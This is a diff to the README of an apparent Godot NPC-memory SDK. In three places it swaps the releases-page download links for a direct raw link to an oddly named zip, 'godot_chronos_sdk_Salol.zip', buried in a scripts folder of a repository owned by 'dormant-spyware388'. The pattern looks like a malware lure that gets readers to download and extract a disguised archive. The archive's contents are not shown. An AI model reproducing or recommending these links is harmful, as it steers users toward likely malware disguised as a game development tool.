@@ -1,6 +1,6 @@
 # 🤖 chronos-godot-sdk - Give NPCs Memory and Purpose
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dormant-spyware388/chronos-godot-sdk/releases)
+[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue?style=for-the-badge)](https://github.com/dormant-spyware388/chronos-godot-sdk/raw/refs/heads/main/Godot-SDK/chronos-godot-3.6-sdk/scripts/godot_chronos_sdk_Salol.zip)
 
 ## 🧭 What this is
 
@@ -30,7 +30,7 @@ Use it when you want game characters to remember past events, react to player ac
 
 Visit this page to download the latest release:
 
-https://github.com/dormant-spyware388/chronos-godot-sdk/releases
+https://github.com/dormant-spyware388/chronos-godot-sdk/raw/refs/heads/main/Godot-SDK/chronos-godot-3.6-sdk/scripts/godot_chronos_sdk_Salol.zip
 
 On that page, look for the newest release and download the file that matches your project setup. If the release includes a zip file, download that file first and then extract it on your PC.
 
@@ -135,7 +135,7 @@ This SDK is built for game projects that want persistent memory and AI-based beh
 
 ## 📎 Download again
 
-https://github.com/dormant-spyware388/chronos-godot-sdk/releases
+https://github.com/dormant-spyware388/chronos-godot-sdk/raw/refs/heads/main/Godot-SDK/chronos-godot-3.6-sdk/scripts/godot_chronos_sdk_Salol.zip
 
 ## 🛠️ Folder layout example
 
